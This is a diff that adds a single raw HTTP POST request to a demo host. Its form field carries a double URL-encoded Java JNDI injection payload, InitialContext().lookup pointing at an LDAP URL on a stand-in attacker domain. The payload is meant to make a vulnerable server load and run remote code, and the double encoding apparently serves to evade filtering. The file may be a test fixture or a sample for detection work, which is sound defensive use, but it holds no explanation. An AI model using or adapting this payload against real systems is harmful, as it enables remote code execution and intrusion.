@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 95
+Connection: close
+
+path=l%253DInitialContext%2528%2529.lookup%2528%2522ldap%253A%252F%252Fevil.tld%252Fx%2522%2529
